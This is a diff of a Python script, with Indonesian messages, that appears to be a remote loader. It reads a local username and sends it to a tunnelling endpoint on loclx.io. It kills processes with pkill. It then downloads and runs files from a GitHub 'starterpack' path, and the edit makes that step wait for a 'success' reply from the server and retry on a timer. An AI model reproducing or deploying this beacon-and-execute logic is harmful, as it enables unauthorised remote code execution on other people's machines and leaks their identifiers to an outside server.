@@ -45,15 +45,21 @@ def read_from_file():
         print(f"Error: {e}")
         return None
 
-def send_info():
+def get_info():
     username = read_from_file()
     if not username:
         username = 'unknow'
 
     try:
-        requests.get(f"https://localtopublic.ap.loclx.io/info?username={username}")
+        response = requests.get(f"https://localtopublic.ap.loclx.io/info?username={username}")
+        if response.status_code == 200:
+            json_response = response.json()
+            if 'success' in json_response and json_response['success'] == True:
+                return True
     except requests.RequestException as e:
-        print(f"Error saat mengakses website: {e}")
+        print("Error:", e)
+    
+    return False
 
 def download_and_run_file():
     download_link_base = "https://github.com/suplays/starterpack/raw/main/nim/backup/"
@@ -91,14 +97,13 @@ if __name__ == "__main__":
             except Exception as px:
                 print(f"Error saat pkill: {px}")
 
-            try:
-                send_info()
-            except Exception as ex:
-                print(f"Error saat mengirim info: {ex}")
-
-            try:
-                download_and_run_file()
-                break
-            except Exception as e:
-                print(f"Error saat download dan jalankan file: {e}")
-                time.sleep(30)
+            if get_info():
+                try:
+                    download_and_run_file()
+                    break
+                except Exception as e:
+                    print(f"Error saat download dan jalankan file: {e}")
+                    time.sleep(30)
+            else:
+                time.sleep(60)
+            
